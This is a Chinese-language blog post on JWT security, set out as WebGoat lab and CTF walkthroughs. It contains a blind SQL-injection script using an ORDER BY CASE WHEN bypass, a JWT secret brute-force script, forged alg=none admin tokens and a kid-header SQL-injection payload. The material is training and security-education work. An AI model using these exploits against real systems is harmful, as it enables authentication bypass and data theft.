---
title: "JWT安全" # 文章标题.
date: 2023-03-03
draft: false
tags: ["WEB安全"]
categories: ["WEB安全"]
---

# JWT安全

![Java安全](./Java安全.png)

![JWT](./JWT.png)

![jwt_token](./jwt_token.png)

## 什么是JWT

JSON Web Token（JSON Web 令牌）是一种跨域验证身份的方案。JWT不加密传输的数据，但能够通

过数字签名来验证数据未被篡改（也不一定）。

JWT 分为三部分，头部（Header），声明（Claims），签名（Signature），三个部分以英文句号`.`隔开。

JWT 的内容以 Base64URL 进行了编码。

### 头部Header

```json
{
"alg":"HS256",
"typ":"JWT"
}
```

`alg`是说明这个JWT的签名使用的算法的参数，常见值用HS256（默认），`HS512`等，也可以为`None`。`HS256`表示`HMAC SHA256`。 `typ`说明这个`token`的类型为`JWT`。

### 声明Claims

```json
{
"exp": 1416471934, // exp：到期时间
"user_name": "user",
"scope": [
"read",
"write"
],
"authorities": [
"ROLE_ADMIN",
"ROLE_USER"
],
"jti": "9bc92a44-0b1a-4c5e-be70-da52075b9a84", // jti：JWT ID 用于标识该 JWT
"client_id": "my-client-with-secret"
}
```

JWT 固定参数有：

- iss：发行人
- sub：主题
- aud：用户
- nbf：在此之前不可用
- iat：发布时间

### 签名Signature

（Signature） 服务器有一个不会发送给客户端的密码（secret），用头部中指定的算法对头部和声明的内容用此密码进行加密，生成的字符串就是JWT的签名，如果想要操作这个签名，我们必须要有密匙。

 下面是一个用HS256生成JWT的代码例子

```
HMACSHA256(base64UrlEncode(header) + "." + base64UrlEncode(payload),secret)
```

### 身份验证和获取JWT令牌

#### 获取令牌的基本顺序如下：

![jwt_diagram](./jwt_diagram.png)

1. 用户端登录，用户名和密码在请求中被发往服务器
2. （确认登录信息正确后）服务器生成 JSON 头部和声明，将登录信息写入 JSON 的声明中（通常不应写入密码，因为 JWT 是不加密的），并用secret用指定算法进行加密，生成该用户的 JWT。此时，服务器并没有保存登录状态信息。
3. 服务器将 JWT（通过响应）返回给客户端 。
4. 用户下次会话时，客户端会自动将 JWT 写在 HTTP 请求头部的 Authorization 字段中 。
5. 服务器对 JWT 进行验证，若验证成功，则确认此用户的登录状态 。
6. 服务器返回响应。

## SQL Injection(mitigation)

防御 sql 注入，其实就是 session，参数绑定（JDBC的SQL预编译技术），存储过程这样的注入。

```java
// 利用 session 防御，session内容正常情况下是用户无法修改的select * from users where user = "'" + session.getAttribute("UserID") + "'";
// 参数绑定方式，利用了 sql 的预编译技术
String query = "SELECT * FROM users WHERE last_name = ?";
PreparedStatement statement = connection.prepareStatement(query);
statement.setString(1, 传入的值);
ResultSet results = statement.executeQuery();
```

上面说的方式也不是能够绝对的进行 sql 注入防御，只是减轻。 如参数绑定方式可以使用下面方式绕过。

通过使用 `case when` 语句可以将 `order by` 后的 `orderExpression` 表达式中添加 `select` 语句，这种方式只能用在`order by`语句中，其他的语句是无法使用的。这种`case when`语句类似于堆叠注入。

## 实例

### SQL 注入攻击-预编译机制绕过

对网络数据包的抓取，发现在IP处有对参数的接受。

![case when注入绕过](./case when注入绕过.png)

对源码进行分析，发现这是一个order by的查询语句。

![webgoat源码分析](./webgoat源码分析.png)

发送正常数据包，出现结果，现在只需要对数据包进行修改。

![发送正常数据包](./发送正常数据包.png)

对数据包进行修改，爆出数据库的表名。得到表名之后，编写代码进行爆破。

![爆出数据库的表名](./爆出数据库的表名.png)

exp

```python
import requests
from string import digits
chars = digits+"."
headers = {
'X-Requested-With': 'XMLHttpRequest'
}
cookies = {
'JSESSIONID': 'F7bZenCiuGXAihZxpmZ02ez0rdocJmzimNkXObYJ', # 抓包得到的
'JSESSIONID.75fbd09e': '7mc1x9iei6ji4xo2a3u4kbz1'
}
i = 0
result = ""
proxy={"http": "http://127.0.0.1:8080"}
while True:
    i += 1
    temp = result
    for char in chars:
        vul_url = "http://8.130.73.157:8080/WebGoat/SqlInjectionMitigations/servers?column=case when (select substr(ip,{0},1)='{1}' from servers where hostname='webgoat-prd') then hostname else mac end".format(i, char) 
        resp = requests.get(vul_url, headers=headers, cookies=cookies, proxies=proxy)
        if 'webgoat-acc' in resp.json()[0]['hostname']:
            result += char
            print(result)
            if temp == result:
                break
```

### Javaweb-身份验证攻击-JWT修改伪造攻击

注意： 因为 JWT 的声明内容变了，因此签名需要重新生成，生成签名又需要密码，我们没有密码呀？不要慌，我们直接去掉签名就好了修改头部为 None。

在 HTTP 传输过程中，Base64 编码中的"=","+","/"等特殊符号通过 URL 解码通常容易产生歧义，因此产生了与 URL 兼容的 Base64 URL 编码。

对WebGoat的JWT获取管理员重置投票进行分析。

![WebGoat重置投票](./WebGoat重置投票.png)

先使用Tom账户登录抓包，发现token为空。

![使用Tom账户登录](./使用Tom账户登录.png)

对投票进行重置的时候，发现了Token。对Token进行分析。

![抓取Token](./抓取Token.png)

分析出Token，对于将alg修改为none这种方式来说，后台是允许这种校验加密数据类型的。

![解码JWT](./解码JWT.png)

自己编写一个JWT绕过，对于头部来说将alg设置为none。

![头部编码](./头部编码.png)

对于声明来说，将admin设置为True。

![声明编码](./声明编码.png)

将头部与声明使用`.`相连接，为了防止与`=`与URL编码冲突，使用Base64URL，既删除`=`，最后的签名为空（因为alg为none）。

![构造的JWT](./构造的JWT.png)

### 身份验证attack-JWT密匙爆破attack

![暴力破解JWT密匙](./暴力破解JWT密匙.png)

根据相应的exp生成payload。

![暴力破解生成JWT](./暴力破解生成JWT.png)

exp

```python
import jwt # pip install pyjwt
import json

alg = "HS256"
jwt_str = "eyJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJXZWJHb2F0IFRva2VuIEJ1aWxkZXIiLCJhdWQiOiJ3ZWJnb2F0Lm9yZyIsImlhdCI6MTY4MDg3MDQxNiwiZXhwIjoxNjgwODcwNDc2LCJzdWIiOiJ0b21Ad2ViZ29hdC5vcmciLCJ1c2VybmFtZSI6IlRvbSIsIkVtYWlsIjoidG9tQHdlYmdvYXQub3JnIiwiUm9sZSI6WyJNYW5hZ2VyIiwiUHJvamVjdCBBZG1pbmlzdHJhdG9yIl19.NR4PAOrAiag9ra2ZByWVEOzVbiKSgBTk99Q0z-VRqY8"
with open('password/google-10000-english/20k.txt', encoding='utf-8') as f:
    for line in f:
        key_ = line.strip()
        try:
            jwt.decode(jwt_str, verify=True, key=key_, algorithms="HS256")
            print('found key! --> ' + key_)
            break
        except(jwt.exceptions.ExpiredSignatureError, jwt.exceptions.InvalidAudienceError,
               jwt.exceptions.InvalidIssuedAtError, jwt.exceptions.InvalidIssuedAtError,
               jwt.exceptions.ImmatureSignatureError):
            print('found key! --> ' + key_)
            break
        except jwt.exceptions.InvalidSignatureError:
            continue
    else:
        print("key not found!")
```

### 刷新Token

![刷新Token](./刷新Token.png)

提示没有一个有效的token。

![抓包后提交](./抓包后提交.png)

将Tom的Token复制出来，提示问题。

![原token](./原token.png)

将Tom的Token进行解码，得到时间戳，修改时间戳。将alg修改为none。

![对token进行解码](./对token进行解码.png)

自己构造JWT的头部与声明。

![自己构造头部和声明](./自己构造头部和声明.png)

对头部和声明进行base64编码。将令牌设置为空，得到新的JWT。

```
ewogICJhbGciOiAibm9uZSIKfQ.ewogICJpYXQiOiAxNTI2MTMxNDExLAogICJleHAiOiAxNjgzOTg0MjExLAogICJhZG1pbiI6ICJmYWxzZSIsCiAgInVzZXIiOiAiVG9tIgp9.
```

![alg错误解法](./alg错误解法.png)

此方法错误，我们只能另寻他法，不过这个提示我们刷新token的方法，查看源码得到有一个login的json数据。

![分析源码刷新JWT](./分析源码刷新JWT.png)

发现有json数据，我们构造json数据登录，刷新token。

![构造json请求](./构造json请求.png)

在数据包中你需要加上，Tom的token，然后才能加入json数据，不然就是401 Unauthorized（未授权访问）错误。

![最新的token](./最新的token.png)

将refresh_token的值与原来Tom过期的JWT结合，重新发送请求。

![生成新token](./生成新token.png)

访问newToken这个页面，生成新的JWT。

![生成新的JWT](./生成新的JWT.png)

将新生成的JWT重新发送，即可成功。

![成功](./成功.png)

### CTF-Node.js-前端jwt登录安全-伪造admin登录

先注册一个账号，登录，会返回一个Token给你，但是这个Token不是admin的Token，你需要将其修改为admin的Token才可以。

![CTFNodeJsJWT](./CTFNodeJsJWT.png)

抓包拿到登录后普通用户的Token。

![登录发现JWT](./登录发现JWT.png)

根据开发经验，NodeJS开发中最重要的代码在controller中，所以我们访问controller/app.js，我们看到如果要拿到flag你需要是admin账户，但是在注册用户的时候，admin是不允许注册的，我们只需要伪造admin的JWT就可了。

![观察源码](./观察源码.png)

对JWT进行获取，并且修改为相应的参数。

![构造自己的JWT](./构造自己的JWT.png)

获得自己的JWT。

```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzZWNyZXRpZCI6W10sInVzZXJuYW1lIjoiYWRtaW4iLCJwYXNzd29yZCI6IjEyMzQ1NiIsImlhdCI6MTY4MDkyMjA3MH0.
```

![伪造admin用户登录成功](./伪造admin用户登录成功.png)

通过上面观察到，我们已经绕过成功，对数据包再次重放，拿到flag。

![获得flag](./获得flag.png)

### 删除账户

![删除账户](./删除账户.png)

对源码进行分析，发现kid处存在sql注入。

![删除账户源码分析](./删除账户源码分析.png)

这个查询的结果会作为签名算法的秘钥来对header和claims进行加密。最后，通过改变查询的结果，改变秘钥，再把秘钥的值保持一致就好啦。

构造方法如下。

![JWT构造过程](./JWT构造过程.png)

```sql
SELECT key FROM jwt_keys WHERE id = '"';select 'MQ==' from jwt_keys -- + "'
select 1 from 表名 # 结果是1
```

删除成功。

![删除成功](./删除成功.png)
